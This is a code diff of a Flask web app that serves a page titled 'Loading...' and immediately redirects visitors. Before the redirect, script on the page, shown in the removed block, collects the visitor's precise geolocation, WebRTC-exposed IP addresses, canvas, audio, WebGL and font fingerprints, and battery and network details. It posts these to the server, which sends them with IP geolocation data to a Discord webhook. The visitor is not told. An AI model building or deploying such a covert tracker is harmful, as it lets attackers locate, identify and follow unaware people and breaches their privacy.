@@ -1,33 +1,37 @@
-import os
-import json
-import time
-import threading
-import uuid
-from datetime import datetime, timezone
-import requests
-from flask import Flask, request, make_response
+import os # OS library is used for inrecting with operatyng system, file paths and etc
+import json # for parsing and generating JSON data
+import time # time library is used for measuring response time and timestamps
+import threading # for running tasks in parallel threads
+import uuid # used to generate unique vivitor ID
+from datetime import datetime, timezone # for working with date and time, including UTC timezone
+import requests # for making HTTP requests to external services (like Discord webhook)
+from flask import Flask, request, make_response, render_template
 from dotenv import load_dotenv
 
+"""
+os.path.dirname(__file__) gets the directory of the current file (app.p)
+os.path.join puts .env file inside the same directory ass app.py
+load_dotenv loads the environment variables from the .env file into the application
+"""
 load_dotenv(os.path.join(os.path.dirname(__file__), ".env"))
 
 app = Flask(__name__)
 
-# environment variables
+""" Load configuration from environment variables """
 DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
 ADMIN_USER = os.getenv("ADMIN_USER")
 ADMIN_PASS = os.getenv("ADMIN_PASS")
 REDIRECT_URL = os.getenv("REDIRECT_URL")
 
 
-# ---------- Discord ----------
-def _send_to_discord(payload):
+""" Discord """
+def _send_to_discord(payload): # this function recieves python dictionary containing the message that must be sent to discord.
     if not DISCORD_WEBHOOK_URL:
         return
 
     try:
         response = requests.post(DISCORD_WEBHOOK_URL, json=payload, timeout=5)
-
-        if response.status_code not in (200, 204):
+        if response.status_code not in (200, 204): #Discord normally responds with HTTP status code 200 or 204 for successfull requests.
             print("Discord webhook error:", response.status_code,
                   response.text[:1000])
 
@@ -35,17 +39,22 @@ def _send_to_discord(payload):
         print("Discord request error:", e)
 
 
+""" Format WebRTC data for Discord embed"""
 def format_webrtc(webrtc):
-    if not isinstance(webrtc, dict):
-        return "❌ WebRTC data unavailable"
+    if not isinstance(webrtc, dict): #checks whethere webrtc is a dictionary 
+        return "WebRTC data unavailable"
 
     if not webrtc.get("supported"):
-        return "❌ WebRTC not supported"
+        return "WebRTC not supported"
 
-    candidates = webrtc.get("candidates", [])
+    """
+    Candidates" are potential network paths (IP addresses and ports) that a browser can use to connect to another peer. 
+    If the list is empty, it means the browser successfully blocked or masked its identity, so there is nothing to format.
+    """
+    candidates = webrtc.get("candidates", [])# gets candidates from the list, if it doesnt exist [] set by default
 
     if not candidates:
-        return "⚠️ No ICE candidates exposed"
+        return "No ICE candidates exposed"
 
     lines = []
 
@@ -74,18 +83,18 @@ def format_webrtc(webrtc):
                      f"Protocol: `{protocol}`\n"
                      f"Port: `{port}`")
 
-    return "\n\n".join(lines)[:1024]
+    return "\n\n".join(lines)[:1024] #It glues all the individual candidate blocks stored in the lines list together, separating them with two newlines (\n\n) for clean paragraph breaks.[:1024] utilizes Python string slicing to strictly chop the final string at 1,024 characters.
 
-
+""" Format font detection data for Discord embed """
 def format_fonts(fonts):
-    if not isinstance(fonts, dict):
-        return "❌ Font detection unavailable"
+    if not isinstance(fonts, dict): 
+        return "Font detection unavailable"
 
     detected = fonts.get("detectedFonts", [])
     count = fonts.get("count", len(detected))
 
     if not detected:
-        return "⚠️ No tested fonts detected"
+        return "No tested fonts detected"
 
     # Discord embed field limit
     max_fonts = 35
@@ -102,23 +111,24 @@ def format_fonts(fonts):
     return "\n".join(lines)[:1024]
 
 
+# Formats browser's geolocation API reuslt
 def format_location(location):
     if not isinstance(location, dict):
-        return "❌ Location unavailable"
+        return "Location unavailable"
 
     if not location.get("supported"):
-        return "❌ Geolocation not supported"
+        return "Geolocation not supported"
 
     if not location.get("granted"):
         reason = location.get("reason") or "Permission denied"
-        return f"❌ Permission not granted\n`{reason}`"
+        return f"Permission not granted\n`{reason}`"
 
     latitude = location.get("latitude")
     longitude = location.get("longitude")
     accuracy = location.get("accuracyMeters")
 
     if latitude is None or longitude is None:
-        return "⚠️ Coordinates unavailable"
+        return "Coordinates unavailable"
 
     accuracy_text = (f"{round(float(accuracy), 1)} m"
                      if accuracy is not None else "unknown")
@@ -130,6 +140,7 @@ def format_location(location):
             f"(https://www.google.com/maps?q={latitude},{longitude})")[:1024]
 
 
+# Sends the collected data to Discord webhook
 def notify_discord(data):
     if not DISCORD_WEBHOOK_URL:
         return
@@ -168,6 +179,7 @@ def notify_discord(data):
                         f"**Latency:** `{rtt} ms`\n"
                         f"**Data Saver:** `{'On' if save_data else 'Off'}`")
 
+    # Helper function to clean and limit string values
     def clean(value, limit=100):
         if value is None:
             return "unknown"
@@ -179,14 +191,14 @@ def notify_discord(data):
 
         return value[:limit]
 
+    # Prepare Discord embed fields
     fields = [
         {
             "name":
             "🌐 IP & 📍 Location",
             "value": (f"**IP:** `{clean(data.get('ip'))}`\n\n"
                       f"{format_location(data.get('location'))}")[:1024],
-            "inline":
-            False,
+            "inline": False,
         },
         {
             "name": "Country",
@@ -204,7 +216,7 @@ def notify_discord(data):
             "inline": True,
         },
         {
-            "name": "ASN",
+            "name": "ASN", #An Autonomous System Number (ASN) is a unique identification number assigned to a large block of IP addresses managed by a single network operator
             "value": clean(data.get("asn")),
             "inline": True,
         },
@@ -259,27 +271,27 @@ def notify_discord(data):
             "inline": False,
         },
         {
-            "name": "Canvas Fingerprint",
+            "name": "Canvas Fingerprint", # fingerprint
             "value": clean(data.get("canvasFingerprint")),
             "inline": False,
         },
         {
-            "name": "Audio Fingerprint",
+            "name": "Audio Fingerprint", # fingerprint
             "value": clean(data.get("audioFingerprint")),
             "inline": False,
         },
         {
-            "name": "Font Detection",
+            "name": "Font Detection", # fingerprint
             "value": format_fonts(data.get("fonts")),
             "inline": False,
         },
         {
-            "name": "WebGL Vendor",
+            "name": "WebGL Vendor", # fingerprint
             "value": clean(data.get("webglVendor")),
             "inline": True,
         },
         {
-            "name": "WebGL Renderer",
+            "name": "WebGL Renderer", # fingerprint
             "value": clean(data.get("webglRenderer")),
             "inline": True,
         },
@@ -317,8 +329,11 @@ def notify_discord(data):
             "timestamp": datetime.now(timezone.utc).isoformat(),
         }]
     }
-    threading.Thread(target=_send_to_discord, args=(payload, ),
-                     daemon=True).start()
+    threading.Thread(
+        target=_send_to_discord, 
+        args=(payload, ),
+        daemon=True
+    ).start()
 
 
 # Ip of User
@@ -461,581 +476,7 @@ def get_ip_information(ip):
         return {}
 
 
-# BROWSER JAVASCRIPT
-
-BROWSER_PAGE = """ <!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>Loading...</title>
-</head>
-
-<body>
-
-<script>
-(async function () {
-
-    function safe(value) {
-        try {
-            return value;
-        } catch {
-            return null;
-        }
-    }
-    async function getFontFingerprint() {
-    try {
-        const fontsToTest = [
-            "Arial",
-            "Arial Black",
-            "Calibri",
-            "Cambria",
-            "Comic Sans MS",
-            "Consolas",
-            "Courier New",
-            "Georgia",
-            "Helvetica",
-            "Impact",
-            "Inter",
-            "Lucida Console",
-            "Microsoft Sans Serif",
-            "Segoe UI",
-            "Tahoma",
-            "Times New Roman",
-            "Trebuchet MS",
-            "Verdana",
-            "Roboto",
-            "Noto Sans",
-            "Ubuntu",
-            "DejaVu Sans",
-            "Liberation Sans",
-            "Fira Code",
-            "Fira Sans"
-        ];
-
-        const testString =
-            "mmmmmmmmmmlliWWWW1111@@@@####";
-
-        const canvas = document.createElement("canvas");
-        const ctx = canvas.getContext("2d");
-
-        if (!ctx) return null;
-
-        const baseFont = "monospace";
-        ctx.font = `72px ${baseFont}`;
-
-        const baseWidth = ctx.measureText(testString).width;
-
-        const detected = [];
-
-        for (const font of fontsToTest) {
-            ctx.font = `72px "${font}", ${baseFont}`;
-
-            const width = ctx.measureText(testString).width;
-
-            if (width !== baseWidth) {
-                detected.push(font);
-            }
-        }
-
-        return {
-            detectedFonts: detected,
-            count: detected.length,
-            fingerprint: await sha256(detected.join("|"))
-        };
-
-    } catch {
-        return null;
-    }
-}
-async function getBatteryStatus() {
-    try {
-        if (!navigator.getBattery) {
-            return {
-                supported: false,
-                reason: "Battery API not supported"
-            };
-        }
-
-        const battery = await navigator.getBattery();
-
-        return {
-            supported: true,
-            level: Math.round(battery.level * 100),
-            charging: battery.charging,
-            chargingTime: battery.chargingTime,
-            dischargingTime: battery.dischargingTime
-        };
-
-    } catch (error) {
-        return {
-            supported: false,
-            reason: "Battery information unavailable"
-        };
-    }
-}
-
-
-function getNetworkStatus() {
-    try {
-        const connection =
-            navigator.connection ||
-            navigator.mozConnection ||
-            navigator.webkitConnection;
-
-        if (!connection) {
-            return {
-                supported: false,
-                reason: "Network Information API not supported"
-            };
-        }
-
-        return {
-            supported: true,
-            effectiveType: connection.effectiveType || null,
-            type: connection.type || null,
-            downlink: connection.downlink ?? null,
-            downlinkMax: connection.downlinkMax ?? null,
-            rtt: connection.rtt ?? null,
-            saveData: connection.saveData ?? null
-        };
-
-    } catch (error) {
-        return {
-            supported: false,
-            reason: "Network information unavailable"
-        };
-    }
-}
-async function getPreciseLocation() {
-    return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-            resolve({
-                supported: false,
-                granted: false
-            });
-            return;
-        }
-
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                resolve({
-                    supported: true,
-                    granted: true,
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracyMeters: position.coords.accuracy
-                });
-            },
-            (error) => {
-                resolve({
-                    supported: true,
-                    granted: false,
-                    reason: error.message
-                });
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            }
-        );
-    });
-}
-
-    const data = {
-    location: await getPreciseLocation(),
-
-    language: safe(navigator.language),
-    languages: safe(navigator.languages),
-
-    platform: safe(navigator.platform),
-    userAgent: safe(navigator.userAgent),
-
-    cookieEnabled: safe(navigator.cookieEnabled),
-    doNotTrack: safe(navigator.doNotTrack),
-    online: safe(navigator.onLine),
-
-    hardwareConcurrency:
-        safe(navigator.hardwareConcurrency),
-
-    deviceMemory:
-        safe(navigator.deviceMemory),
-
-    maxTouchPoints:
-        safe(navigator.maxTouchPoints),
-
-    screen:
-        safe(`${screen.width}x${screen.height}`),
-
-    screenWidth:
-        safe(screen.width),
-
-    screenHeight:
-        safe(screen.height),
-
-    availableWidth:
-        safe(screen.availWidth),
-
-    availableHeight:
-        safe(screen.availHeight),
-
-    colorDepth:
-        safe(screen.colorDepth),
-
-    pixelDepth:
-        safe(screen.pixelDepth),
-
-    viewportWidth:
-        safe(window.innerWidth),
-
-    viewportHeight:
-        safe(window.innerHeight),
-
-    devicePixelRatio:
-        safe(window.devicePixelRatio),
-
-    timezone:
-        safe(
-            Intl.DateTimeFormat()
-                .resolvedOptions()
-                .timeZone
-        ),
-
-    timezoneOffset:
-        safe(new Date().getTimezoneOffset()),
-
-    darkMode:
-        safe(
-            window.matchMedia(
-                "(prefers-color-scheme: dark)"
-            ).matches
-        ),
-
-    lightMode:
-        safe(
-            window.matchMedia(
-                "(prefers-color-scheme: light)"
-            ).matches
-        ),
-
-    reducedMotion:
-        safe(
-            window.matchMedia(
-                "(prefers-reduced-motion: reduce)"
-            ).matches
-        ),
-
-    touchSupported:
-        safe("ontouchstart" in window),
-
-    page:
-        safe(window.location.href),
-
-    referrer:
-        safe(document.referrer),
-
-    clientTime:
-        new Date().toISOString(),
-
-    // Fingerprint signals
-    canvasFingerprint:
-        await getCanvasFingerprint(),
-
-    webgl:
-        safe(getWebGLFingerprint()),
-
-    audioFingerprint:
-        await getAudioFingerprint(),
-    
-    webrtc:
-        await getWebRTCDiagnostics(),
-
-    fonts:
-        await getFontFingerprint(),
-        
-    battery:
-        await getBatteryStatus(),
-
-    network:
-        getNetworkStatus()
-};
-
-    try {
-
-        const response = await fetch(
-            "/collect",
-            {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
-            }
-        );
-
-        // Redirect only after telemetry is sent.
-        window.location.replace(
-            __REDIRECT_URL__
-        );
-
-    } catch (error) {
-
-        // If collection fails, still redirect.
-        window.location.replace(
-            __REDIRECT_URL__
-        );
-    }
-
-})();
-async function getWebRTCDiagnostics() {
-    try {
-        if (!window.RTCPeerConnection) {
-            return {
-                supported: false,
-                candidates: []
-            };
-        }
-
-        const pc = new RTCPeerConnection({
-            iceServers: []
-        });
-
-        const candidates = [];
-
-        pc.onicecandidate = (event) => {
-            if (!event.candidate) return;
-
-            const candidate = event.candidate;
-
-            candidates.push({
-                type: candidate.type || null,
-                protocol: candidate.protocol || null,
-                address: candidate.address || null,
-                port: candidate.port || null
-            });
-        };
-
-        pc.createDataChannel("diagnostic");
-
-        const offer = await pc.createOffer();
-        await pc.setLocalDescription(offer);
-
-        await new Promise(resolve => setTimeout(resolve, 1000));
-
-        pc.close();
-
-        return {
-            supported: true,
-            candidates: candidates
-        };
-
-    } catch (error) {
-        return {
-            supported: false,
-            error: String(error)
-        };
-    }
-}
-async function getCanvasFingerprint() {
-        try {
-            const canvas = document.createElement("canvas");
-            canvas.width = 280;
-            canvas.height = 80;
-
-            const ctx = canvas.getContext("2d");
-            if (!ctx) return null;
-
-            ctx.textBaseline = "top";
-            ctx.font = "16px Arial";
-            ctx.fillStyle = "#f60";
-            ctx.fillRect(10, 10, 100, 30);
-
-            ctx.fillStyle = "#069";
-            ctx.fillText(
-                "Browser fingerprint",
-                15,
-                20
-            );
-
-            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-            ctx.fillText(
-                "canvas-test",
-                20,
-                45
-            );
-
-            return await sha256(canvas.toDataURL());
-        } catch {
-            return null;
-        }
-    }
-
-
-    function getWebGLFingerprint() {
-        try {
-            const canvas = document.createElement("canvas");
-
-            const gl =
-                canvas.getContext("webgl") ||
-                canvas.getContext("experimental-webgl");
-
-            if (!gl) {
-                return {
-                    supported: false
-                };
-            }
-
-            const debugInfo =
-                gl.getExtension("WEBGL_debug_renderer_info");
-
-            let vendor = null;
-            let renderer = null;
-
-            if (debugInfo) {
-                vendor = gl.getParameter(
-                    debugInfo.UNMASKED_VENDOR_WEBGL
-                );
-
-                renderer = gl.getParameter(
-                    debugInfo.UNMASKED_RENDERER_WEBGL
-                );
-            }
-
-            return {
-                supported: true,
-                vendor: vendor,
-                renderer: renderer,
-                version: gl.getParameter(gl.VERSION),
-                shadingLanguageVersion:
-                    gl.getParameter(
-                        gl.SHADING_LANGUAGE_VERSION
-                    ),
-                maxTextureSize:
-                    gl.getParameter(
-                        gl.MAX_TEXTURE_SIZE
-                    ),
-                maxViewportDims:
-                    Array.from(
-                        gl.getParameter(
-                            gl.MAX_VIEWPORT_DIMS
-                        )
-                    )
-            };
-
-        } catch {
-            return {
-                supported: false
-            };
-        }
-    }
-
-
-    async function getAudioFingerprint() {
-        try {
-            const AudioContext =
-                window.OfflineAudioContext ||
-                window.webkitOfflineAudioContext;
-
-            if (!AudioContext) {
-                return null;
-            }
-
-            const context = new AudioContext(
-                1,
-                44100,
-                44100
-            );
-
-            const oscillator =
-                context.createOscillator();
-
-            const compressor =
-                context.createDynamicsCompressor();
-
-            oscillator.type = "triangle";
-            oscillator.frequency.value = 10000;
-
-            compressor.threshold.value = -50;
-            compressor.knee.value = 40;
-            compressor.ratio.value = 12;
-            compressor.attack.value = 0;
-            compressor.release.value = 0.25;
-
-            oscillator.connect(compressor);
-            compressor.connect(context.destination);
-
-            oscillator.start(0);
-
-            const buffer =
-                await context.startRendering();
-
-            const channel =
-                buffer.getChannelData(0);
-
-            // Only summarize the result instead of
-            // sending the entire audio buffer.
-            let sum = 0;
-            let weighted = 0;
-
-            const step = Math.max(
-                1,
-                Math.floor(channel.length / 1000)
-            );
-
-            for (
-                let i = 0;
-                i < channel.length;
-                i += step
-            ) {
-                const value = channel[i];
-
-                sum += Math.abs(value);
-                weighted += value * (i + 1);
-            }
-
-            return await sha256(
-                `${sum}|${weighted}|${channel.length}`
-            );
-
-        } catch {
-            return null;
-        }
-    }
-
-
-    async function sha256(value) {
-        try {
-            const data =
-                new TextEncoder().encode(value);
-
-            const hash =
-                await crypto.subtle.digest(
-                    "SHA-256",
-                    data
-                );
-
-            return Array.from(
-                new Uint8Array(hash)
-            )
-                .map(
-                    byte =>
-                        byte
-                            .toString(16)
-                            .padStart(2, "0")
-                )
-                .join("");
-
-        } catch {
-            return null;
-        }
-    }
-</script>
-
-</body>
-</html>
-"""
-
-
+# Visitor ID management
 def get_or_create_visitor_id():
     visitor_id = request.cookies.get("visitor_id")
 
@@ -1045,13 +486,10 @@ def get_or_create_visitor_id():
     return str(uuid.uuid4()), False
 
 
-# visitor route
-
-
+# Main route
 @app.route("/")
 def index():
-
-    start = time.perf_counter()
+    start = time.perf_counter() # timer to understand how much time is needed to process user's data
 
     data = collect_http_data()
 
@@ -1064,16 +502,16 @@ def index():
     geo = get_ip_information(data.get("ip"))
     data.update(geo)
 
-    data["response_time_ms"] = round((time.perf_counter() - start) * 1000, 2)
+    data["response_time_ms"] = round((time.perf_counter() - start) * 1000, 2) # time stops and rounds millieseconds
 
-    visitor_id, is_new = get_or_create_visitor_id()
+    visitor_id, is_new = get_or_create_visitor_id() # unique visitor identifier 
 
     data["visitor_id"] = visitor_id
     data["returning_visitor"] = not is_new
 
-    page = BROWSER_PAGE.replace("__REDIRECT_URL__", json.dumps(REDIRECT_URL))
+    rendered_page = render_template('index.html', redirect_url=REDIRECT_URL)
 
-    response = make_response(page, 200)
+    response = make_response(rendered_page, 200)
 
     # First-party persistent visitor identifier.
     if is_new:
@@ -1087,7 +525,7 @@ def index():
     return response
 
 
-# browser telemetry collection route
+# data collection(telemetry) route. 
 @app.route("/collect", methods=["POST"])
 def collect():
 
